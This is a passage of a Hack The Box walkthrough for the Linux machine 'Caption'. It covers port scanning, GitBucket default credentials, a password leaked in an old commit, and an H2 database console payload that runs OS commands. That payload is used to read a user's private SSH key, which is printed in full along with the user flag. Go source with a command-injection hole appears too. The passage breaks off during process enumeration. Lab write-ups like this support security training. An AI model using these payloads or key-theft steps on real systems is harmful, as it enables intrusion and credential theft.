---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Hard
  - DefaultCredentials
  - H2
  - Database
  - CodeExecution
  - Apache
  - Thrift
  - Go
  - CommandInjection
---

![](images/Caption.png)

## Summary

The box started with `GitBucket` running on port `8080/TCP` which has set the `default credentials` of `root:root`. After the login `two repositories` can be found. The `Logservice repository` provides important information to `escalate privileges` to `root` later in the box. A `Database viewer` for the `H2 database` can be found in the `System administration` section of the `admin` user. This leads to `arbitrary code execution` and to the `foothold` of the box by reading the `id_ecdsa private key` of a user called `margo`. Inside the `home directory` of `margo` the `user.txt` can be found. By performing basic enumeration it is possible to find out that `root` is running a `Go server` binary for which the `source code` is stored inside `GitBucket` mentioned before. The `source code` shows that the `Go server` is vulnerable to `command injection`. After forwarding port `9090/TCP` to the local machine a `malicious logiles` which contains the `matching patterns` shown in the `source code` needs to be placed on the box. To communicate with the `Go server` a custom `.thrift file` can be created in order with a simple `Python script` to tell the server to read the `malicious logfile` which results in `code execution` as `root`. As last step grab the `root.txt` and close the box.

## Table of Contents

- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
    - [Enumeration of Port 8080/TCP](#Enumeration-of-Port-8080TCP)
- [Foothold](#Foothold)
- [user.txt](#usertxt)
- [Enumeration](#Enumeration)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
- [root.txt](#roottxt)

## Reconnaissance

### Port Scanning

The default port scan showed only three ports. Port `22/TCP` as usual, port `80/TCP` as expected and out of the ordinary port `8080/TCP`.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.194.20
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-14 21:03 CEST
Nmap scan report for 10.129.194.20
Host is up (0.017s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http
|_http-title: Did not follow redirect to http://caption.htb
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad request
|     Content-length: 90
|     Cache-Control: no-cache
|     Connection: close
|     Content-Type: text/html
|     <html><body><h1>400 Bad request</h1>
|     Your browser sent an invalid request.
|     </body></html>
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.1 301 Moved Permanently
|     content-length: 0
|     location: http://caption.htb
|_    connection: close
8080/tcp open  http-proxy
|_http-title: GitBucket
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sat, 14 Sep 2024 19:03:15 GMT
|     Set-Cookie: JSESSIONID=node015z2py63ougqw16ejva6ciub1h2.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 5920
|     <!DOCTYPE html>
|     <html prefix="og: http://ogp.me/ns#" lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <title>Error</title>
|     <meta property="og:title" content="Error" />
|     <meta property="og:type" content="object" />
|     <meta property="og:url" content="http://10.129.194.20:8080/nice%20ports%2C/Tri%6Eity.txt%2ebak" />
|     <meta property="og:image" content="http://10.129.194.20:8080/assets/common/images/gitbucket_ogp.png" />
|     <link rel="icon" href="/assets/common/imag
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 14 Sep 2024 19:03:14 GMT
|     Set-Cookie: JSESSIONID=node0z43roxwfusbx8xzqyp1u92bn0.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 7195
|     <!DOCTYPE html>
|     <html prefix="og: http://ogp.me/ns#" lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <title>GitBucket</title>
|     <meta property="og:title" content="GitBucket" />
|     <meta property="og:type" content="object" />
|     <meta property="og:url" content="http://10.129.194.20:8080/" />
|     <meta property="og:image" content="http://10.129.194.20:8080/assets/common/images/gitbucket_ogp.png" />
|     <link rel="icon" href="/assets/common/images/gitbucket.png?20240914190314" typ
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 14 Sep 2024 19:03:14 GMT
|     Set-Cookie: JSESSIONID=node01abvy01q1itkcf535tnyzoh5w1.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|_    <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=9/14%Time=66E5DDF1%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,66,"HTTP/1\.1\x20301\x20Moved\x20Permanently\r\ncontent-lengt
SF:h:\x200\r\nlocation:\x20http://caption\.htb\r\nconnection:\x20close\r\n
SF:\r\n")%r(HTTPOptions,66,"HTTP/1\.1\x20301\x20Moved\x20Permanently\r\nco
SF:ntent-length:\x200\r\nlocation:\x20http://caption\.htb\r\nconnection:\x
SF:20close\r\n\r\n")%r(RTSPRequest,CF,"HTTP/1\.1\x20400\x20Bad\x20request\
SF:r\nContent-length:\x2090\r\nCache-Control:\x20no-cache\r\nConnection:\x
SF:20close\r\nContent-Type:\x20text/html\r\n\r\n<html><body><h1>400\x20Bad
SF:\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20request\.
SF:\n</body></html>\n")%r(X11Probe,CF,"HTTP/1\.1\x20400\x20Bad\x20request\
SF:r\nContent-length:\x2090\r\nCache-Control:\x20no-cache\r\nConnection:\x
SF:20close\r\nContent-Type:\x20text/html\r\n\r\n<html><body><h1>400\x20Bad
SF:\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20request\.
SF:\n</body></html>\n")%r(FourOhFourRequest,66,"HTTP/1\.1\x20301\x20Moved\
SF:x20Permanently\r\ncontent-length:\x200\r\nlocation:\x20http://caption\.
SF:htb\r\nconnection:\x20close\r\n\r\n")%r(RPCCheck,CF,"HTTP/1\.1\x20400\x
SF:20Bad\x20request\r\nContent-length:\x2090\r\nCache-Control:\x20no-cache
SF:\r\nConnection:\x20close\r\nContent-Type:\x20text/html\r\n\r\n<html><bo
SF:dy><h1>400\x20Bad\x20request</h1>\nYour\x20browser\x20sent\x20an\x20inv
SF:alid\x20request\.\n</body></html>\n")%r(DNSVersionBindReqTCP,CF,"HTTP/1
SF:\.1\x20400\x20Bad\x20request\r\nContent-length:\x2090\r\nCache-Control:
SF:\x20no-cache\r\nConnection:\x20close\r\nContent-Type:\x20text/html\r\n\
SF:r\n<html><body><h1>400\x20Bad\x20request</h1>\nYour\x20browser\x20sent\
SF:x20an\x20invalid\x20request\.\n</body></html>\n")%r(DNSStatusRequestTCP
SF:,CF,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-length:\x2090\r\nCac
SF:he-Control:\x20no-cache\r\nConnection:\x20close\r\nContent-Type:\x20tex
SF:t/html\r\n\r\n<html><body><h1>400\x20Bad\x20request</h1>\nYour\x20brows
SF:er\x20sent\x20an\x20invalid\x20request\.\n</body></html>\n")%r(Help,CF,
SF:"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-length:\x2090\r\nCache-C
SF:ontrol:\x20no-cache\r\nConnection:\x20close\r\nContent-Type:\x20text/ht
SF:ml\r\n\r\n<html><body><h1>400\x20Bad\x20request</h1>\nYour\x20browser\x
SF:20sent\x20an\x20invalid\x20request\.\n</body></html>\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.94SVN%I=7%D=9/14%Time=66E5DDF2%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,1D07,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2014\x20Sep\
SF:x202024\x2019:03:14\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node0z43roxwfus
SF:bx8xzqyp1u92bn0\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x200
SF:1\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;chars
SF:et=utf-8\r\nContent-Length:\x207195\r\n\r\n<!DOCTYPE\x20html>\n<html\x2
SF:0prefix=\"og:\x20http://ogp\.me/ns#\"\x20lang=\"en\">\n\x20\x20<head>\n
SF:\x20\x20\x20\x20<meta\x20charset=\"UTF-8\"\x20/>\n\x20\x20\x20\x20<meta
SF:\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale
SF:=1\.0,\x20maximum-scale=5\.0\"\x20/>\n\x20\x20\x20\x20<meta\x20http-equ
SF:iv=\"X-UA-Compatible\"\x20content=\"IE=edge\"\x20/>\n\x20\x20\x20\x20<t
SF:itle>GitBucket</title>\n\x20\x20\x20\x20<meta\x20property=\"og:title\"\
SF:x20content=\"GitBucket\"\x20/>\n\x20\x20\x20\x20<meta\x20property=\"og:
SF:type\"\x20content=\"object\"\x20/>\n\x20\x20\x20\x20<meta\x20property=\
SF:"og:url\"\x20content=\"http://10\.129\.194\.20:8080/\"\x20/>\n\x20\x20\
SF:x20\x20\n\x20\x20\x20\x20\x20\x20<meta\x20property=\"og:image\"\x20cont
SF:ent=\"http://10\.129\.194\.20:8080/assets/common/images/gitbucket_ogp\.
SF:png\"\x20/>\n\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<link\
SF:x20rel=\"icon\"\x20href=\"/assets/common/images/gitbucket\.png\?2024091
SF:4190314\"\x20typ")%r(HTTPOptions,108,"HTTP/1\.1\x20200\x20OK\r\nDate:\x
SF:20Sat,\x2014\x20Sep\x202024\x2019:03:14\x20GMT\r\nSet-Cookie:\x20JSESSI
SF:ONID=node01abvy01q1itkcf535tnyzoh5w1\.node0;\x20Path=/;\x20HttpOnly\r\n
SF:Expires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Typ
SF:e:\x20text/html;charset=utf-8\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\nCon
SF:tent-Length:\x200\r\n\r\n")%r(RTSPRequest,B8,"HTTP/1\.1\x20505\x20HTTP\
SF:x20Version\x20Not\x20Supported\r\nContent-Type:\x20text/html;charset=is
SF:o-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Ba
SF:d\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(Fo
SF:urOhFourRequest,1815,"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x20Sat,
SF:\x2014\x20Sep\x202024\x2019:03:15\x20GMT\r\nSet-Cookie:\x20JSESSIONID=n
SF:ode015z2py63ougqw16ejva6ciub1h2\.node0;\x20Path=/;\x20HttpOnly\r\nExpir
SF:es:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x2
SF:0text/html;charset=utf-8\r\nContent-Length:\x205920\r\n\r\n<!DOCTYPE\x2
SF:0html>\n<html\x20prefix=\"og:\x20http://ogp\.me/ns#\"\x20lang=\"en\">\n
SF:\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\"\x20/>\n\x20\
SF:x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\
SF:x20initial-scale=1\.0,\x20maximum-scale=5\.0\"\x20/>\n\x20\x20\x20\x20<
SF:meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\"\x20/>\n\x
SF:20\x20\x20\x20<title>Error</title>\n\x20\x20\x20\x20<meta\x20property=\
SF:"og:title\"\x20content=\"Error\"\x20/>\n\x20\x20\x20\x20<meta\x20proper
SF:ty=\"og:type\"\x20content=\"object\"\x20/>\n\x20\x20\x20\x20<meta\x20pr
SF:operty=\"og:url\"\x20content=\"http://10\.129\.194\.20:8080/nice%20port
SF:s%2C/Tri%6Eity\.txt%2ebak\"\x20/>\n\x20\x20\x20\x20\n\x20\x20\x20\x20\x
SF:20\x20<meta\x20property=\"og:image\"\x20content=\"http://10\.129\.194\.
SF:20:8080/assets/common/images/gitbucket_ogp\.png\"\x20/>\n\x20\x20\x20\x
SF:20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20href=\"/
SF:assets/common/imag");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.60 seconds
```

### Enumeration of Port 80/TCP

We accessed port `80/TCP` using the `IP address` and got redirected to `caption.htb` which we added to our `/etc/hosts` file.

- [http://10.129.194.20/](http://10.129.194.20/)

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.194.20   caption.htb
```

- [http://caption.htb/](http://caption.htb/)

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://caption.htb/
http://caption.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.1 Python/3.10.12], IP[10.129.194.20], PasswordField[password], Python[3.10.12], Script, Title[Caption Portal Login], UncommonHeaders[x-varnish], Varnish, Via-Proxy[1.1 varnish (Varnish/6.6)], Werkzeug[3.0.1], X-UA-Compatible[IE=edge]
```

The website greeted us with a `Caption Portal Login` form. We tried a few well known combinations but couldn't login.

![](images/2024-09-14_21-05_80_website.png)

### Enumeration of Port 8080/TCP

Next we headed to check out port `8080/TCP` and found an application called `GitBucket` running.

- [http://caption.htb:8080/](http://caption.htb:8080/)

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://caption.htb:8080/
http://caption.htb:8080/ [200 OK] Bootstrap, Cookies[JSESSIONID], Country[RESERVED][ZZ], HTML5, HttpOnly[JSESSIONID], IP[10.129.194.20], JQuery[3.5.1], Open-Graph-Protocol[object], Script[text/javascript], Title[GitBucket], X-UA-Compatible[IE=edge]
```

![](images/2024-09-14_21-12_8080_gitbucket.png)

We searched Google to find the `default credentials` and logged in with `root:root`.

- [https://github.com/gitbucket/gitbucket/blob/master/README.md#installation](https://github.com/gitbucket/gitbucket/blob/master/README.md#installation)

| Username | Password |
| -------- | -------- |
| root     | root     |

On the `dashboard` we found `two repositories`. One called `Logservice` and one called `Caption Portal`.

![](images/2024-09-14_21-14_8080_root_login.png)

We started with a closer look onto the `Logservice repository`.

![](images/2024-09-14_21-15_8080_logservice.png)

The `Logservice` repository seemed to be a `server` written in `Go` which could be vulnerable to `Command Injection`.

- [http://caption.htb:8080/root/Logservice/blob/main/server.go](http://caption.htb:8080/root/Logservice/blob/main/server.go)

```go
package main
 
import (
    "context"
    "fmt"
    "log"
    "os"
    "bufio"
    "regexp"
    "time"
    "github.com/apache/thrift/lib/go/thrift"
    "os/exec"
    "log_service"
)
 
type LogServiceHandler struct{}
 
func (l *LogServiceHandler) ReadLogFile(ctx context.Context, filePath string) (r string, err error) {
    file, err := os.Open(filePath)
    if err != nil {
        return "", fmt.Errorf("error opening log file: %v", err)
    }
    defer file.Close()
    ipRegex := regexp.MustCompile(`\b(?:\d{1,3}\.){3}\d{1,3}\b`)
    userAgentRegex := regexp.MustCompile(`"user-agent":"([^"]+)"`)
    outputFile, err := os.Create("output.log")
    if err != nil {
        fmt.Println("Error creating output file:", err)
        return
    }
    defer outputFile.Close()
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        line := scanner.Text()
        ip := ipRegex.FindString(line)
        userAgentMatch := userAgentRegex.FindStringSubmatch(line)
        var userAgent string
        if len(userAgentMatch) > 1 {
            userAgent = userAgentMatch[1]
        }
        timestamp := time.Now().Format(time.RFC3339)
        logs := fmt.Sprintf("echo 'IP Address: %s, User-Agent: %s, Timestamp: %s' >> output.log", ip, userAgent, timestamp)
        exec.Command{"/bin/sh", "-c", logs}
    }
    return "Log file processed",nil
}
 
func main() {
    handler := &LogServiceHandler{}
    processor := log_service.NewLogServiceProcessor(handler)
    transport, err := thrift.NewTServerSocket(":9090")
    if err != nil {
        log.Fatalf("Error creating transport: %v", err)
    }
 
    server := thrift.NewTSimpleServer4(processor, transport, thrift.NewTTransportFactory(), thrift.NewTBinaryProtocolFactoryDefault())
    log.Println("Starting the server...")
    if err := server.Serve(); err != nil {
        log.Fatalf("Error occurred while serving: %v", err)
    }
}
```

The server would parse a specific `logfile` for a matching `pattern` and then use `exec.command` to execute whatever we would insert through `command injection`.

```c
        timestamp := time.Now().Format(time.RFC3339)
        logs := fmt.Sprintf("echo 'IP Address: %s, User-Agent: %s, Timestamp: %s' >> output.log", ip, userAgent, timestamp)
        exec.Command{"/bin/sh", "-c", logs}
```

Next we checked the `Caption Portal` repository and found `credentials` in and `old commit` for the `haproxy.cfg`.

![](images/2024-09-14_21-17_8080_caption_portal.png)

- [http://caption.htb:8080/root/Caption-Portal/blob/main/config/haproxy/haproxy.cfg](http://caption.htb:8080/root/Caption-Portal/blob/main/config/haproxy/haproxy.cfg)

```c
global
        log /dev/log    local0
        log /dev/log    local1 notice
        chroot /var/lib/haproxy
        stats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners
        stats timeout 30s
        user haproxy
        group haproxy
        daemon
 
        # Default SSL material locations
        ca-base /etc/ssl/certs
        crt-base /etc/ssl/private
 
        # See: https://ssl-config.mozilla.org/#server=haproxy&server-version=2.0.3&config=intermediate
        ssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
        ssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256
        ssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets
 
defaults
        log     global
        mode    http
        option  httplog
        option  dontlognull
        timeout connect 5000
        timeout client  50000
        timeout server  50000
        errorfile 400 /etc/haproxy/errors/400.http
        errorfile 403 /etc/haproxy/errors/403.http
        errorfile 408 /etc/haproxy/errors/408.http
        errorfile 500 /etc/haproxy/errors/500.http
        errorfile 502 /etc/haproxy/errors/502.http
        errorfile 503 /etc/haproxy/errors/503.http
        errorfile 504 /etc/haproxy/errors/504.http
 
 
frontend http_front
   bind *:80
   default_backend http_back
   acl restricted_page path_beg,url_dec -i /logs
   acl restricted_page path_beg,url_dec -i /download
   http-request deny if restricted_page
   acl not_caption hdr_beg(host) -i caption.htb
   http-request redirect code 301 location http://caption.htb if !not_caption
 
backend http_back
   balance roundrobin
   server server1 127.0.0.1:6081 check
```

- [http://caption.htb:8080/root/Caption-Portal/commit/0e3bafe458d0b821d28dde7d6f43721f479abe4a](http://caption.htb:8080/root/Caption-Portal/commit/0e3bafe458d0b821d28dde7d6f43721f479abe4a)

![](images/2024-09-14_21-17_8080_caption_portal_commit_history_credentials.png)

```c
userlist AuthUsers
        user margo insecure-password vFr&cS2#0!
```

| Username | Password   |
| -------- | ---------- |
| margo    | vFr&cS2#0! |

## Foothold

Since we could not get the `command injection` to work we enumerated the `GitBucket` application a little more and found a `Database viewer` in the `System administration` section of the `admin` user.

![](images/2024-09-14_22-41_8080_database_viewer.png)

This allowed us to execute `arbitrary commands` on the box and therefore get `code execution`.

- [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/h2-java-sql-database](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/h2-java-sql-database)
- [https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed](https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed)

```c
CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : ""; }$$;
```

![](images/2024-09-14_22-49_8080_rce_payload.png)

```c
CALL EXECVE('id')
```

![](images/2024-09-14_22-50_8080_rce_execution.png)

After we checked all available `users` on the system by reading the `/etc/passwd` we looked for potential `SSH keys` in their `home directories` and found one for `margo` which allowed us to login via `SSH` and to grab the `user.txt`.

```c
CALL EXECVE('cat /home/margo/.ssh/id_ecdsa');
```

![](images/2024-09-14_22-54_8080_margo_ssh_key.png)

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Caption/file]
└─$ cat ed_ecdsa_margo 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS1zaGEy
LW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQjyF7qFayL8/0CV2KdKUEPZU1B3FD64EHgn4mqGfi3
G8dTuIfCMSE6HrIgV9yxlWLbCqZPbk6SlwYzszeaXjioAAAAoJz1R/ac9Uf2AAAAE2VjZHNhLXNo
YTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCPIXuoVrIvz/QJXYp0pQQ9lTUHcUPrgQeCfiaoZ
+Lcbx1O4h8IxIToesiBX3LGVYtsKpk9uTpKXBjOzN5peOKgAAAAhAMIQb0fdHIUM5nGdHRjrrGmW
+XK6gHM0wM5DxDY+bDCTAAAAAAECAwQFBgc=
-----END OPENSSH PRIVATE KEY-----
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Caption/file]
└─$ chmod 600 ed_ecdsa_margo
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Caption/file]
└─$ ssh -i ed_ecdsa_margo margo@caption.htb
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Sep 14 08:56:23 PM UTC 2024

  System load:  0.04              Processes:             231
  Usage of /:   70.5% of 8.76GB   Users logged in:       0
  Memory usage: 26%               IPv4 address for eth0: 10.129.194.20
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

3 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


Last login: Tue Sep 10 12:33:42 2024 from 10.10.14.23
margo@caption:~$
```

## user.txt

```c
margo@caption:~$ cat user.txt 
761d0a51910d036db043bae77476b639
```

## Enumeration

As usually we proceed with some basic enumeration. We checked `user groups`. 

```c
margo@caption:~$ id
uid=1000(margo) gid=1000(margo) groups=1000(margo)
```

All `available users` again since now it would be much more readable.

```c
margo@caption:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
haproxy:x:114:120::/var/lib/haproxy:/usr/sbin/nologin
varnish:x:115:121::/nonexistent:/usr/sbin/nologin
vcache:x:116:121::/nonexistent:/usr/sbin/nologin
varnishlog:x:117:121::/nonexistent:/usr/sbin/nologin
margo:x:1000:1000:,,,:/home/margo:/bin/bash
ruth:x:1001:1001:,,,:/home/ruth:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

| Username |
| -------- |
| ruth     |

And if our previously found `password` would work on `margo`.

```c
margo@caption:~$ sudo -l
[sudo] password for margo: 
sudo: a password is required
```

We also took a close look on his `home directory` to see if we find any interesting files.

```c
margo@caption:~$ ls -la
total 78516
drwxr-x--- 10 margo margo     4096 Aug 30 10:17 .
drwxr-xr-x  4 root  root      4096 Aug 30 10:17 ..
drwxrwxr-x  4 margo margo     4096 Aug 30 10:17 app
lrwxrwxrwx  1 margo margo        9 Mar  6  2024 .bash_history -> /dev/null
-rw-r--r--  1 margo margo      220 Mar  6  2024 .bash_logout
-rw-r--r--  1 margo margo     3771 Mar  6  2024 .bashrc
drwx------  3 margo margo     4096 Aug 30 10:17 .cache
drwxrwxr-x  4 margo margo     4096 Aug 30 10:17 .config
-rw-rw-r--  1 margo margo   628682 Jul  8  2023 copyparty-sfx.py
drwxrwxr-x  6 margo margo     4096 Sep 14 20:45 .gitbucket
-rw-rw-r--  1 margo margo 79701346 Oct 22  2023 gitbucket.war
drwxrwxr-x  3 margo margo     4096 Aug 30 10:17 .java
drwxrwxr-x  5 margo margo     4096 Aug 30 10:17 .local
drwxrwxr-x  2 margo margo     4096 Aug 30 10:17 logs
-rw-r--r--  1 margo margo      807 Mar  6  2024 .profile
drwx------  2 margo margo     4096 Sep 14 19:01 .ssh
-rw-r-----  1 root  margo       33 Sep 14 19:02 user.txt
```

As we went to see if any processes could be a potential vector for `privilege escalation`, we noticed that `root` was running a `Go server binary`.

```c
margo@caption:~$ ps -auxf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
<--- CUT FOR BREVITY --->
root         862  0.0  0.3 317960 12228 ?        Ssl  19:01   0:00 /usr/sbin/ModemManager
root        1015  0.0  0.0   6896  2884 ?        Ss   19:01   0:00 /usr/sbin/cron -f -P
root        1030  0.0  0.1  10344  4140 ?        S    19:01   0:00  \_ /usr/sbin/CRON -f -P
ruth        1049  0.0  0.0   2892  1004 ?        Ss   19:01   0:00  |   \_ /bin/sh -c cd /home/ruth;bash varnish_logs.sh
ruth        1050  0.0  0.0   7372  3556 ?        S    19:01   0:00  |       \_ bash varnish_logs.sh
ruth        1054  1.0  1.1  86284 46712 ?        S    19:01   1:13  |           \_ varnishncsa -c -F %{VCL_Log:client_ip}x
ruth        1055  0.0  0.0   7372  2128 ?        S    19:01   0:00  |           \_ bash varnish_logs.sh
root        1031  0.0  0.1  10344  4140 ?        S    19:01   0:00  \_ /usr/sbin/CRON -f -P
margo       1048  0.0  0.0   2892   956 ?        Ss   19:01   0:00  |   \_ /bin/sh -c cd /home/margo;/usr/bin/java -jar gitbucket.war
margo       1051  2.8 16.5 3744684 663716 ?      Sl   19:01   3:23  |       \_ /usr/bin/java -jar gitbucket.war
root        1032  0.0  0.1  10344  4140 ?        S    19:01   0:00  \_ /usr/sbin/CRON -f -P
margo       1052  0.0  0.0   2892   984 ?        Ss   19:01   0:00  |   \_ /bin/sh -c cd /home/margo/app;python3 app.py
margo       1053  0.4  1.1 746464 46700 ?        S    19:01   0:32  |       \_ python3 app.py
root        1033  0.0  0.1  10344  4140 ?        S    19:01   0:00  \_ /usr/sbin/CRON -f -P
margo       1056  0.0  0.0   2892  1040 ?        Ss   19:01   0:00  |   \_ /bin/sh -c cd /home/margo;python3 copyparty-sfx.py -i 127.0.0.1 -v logs::r
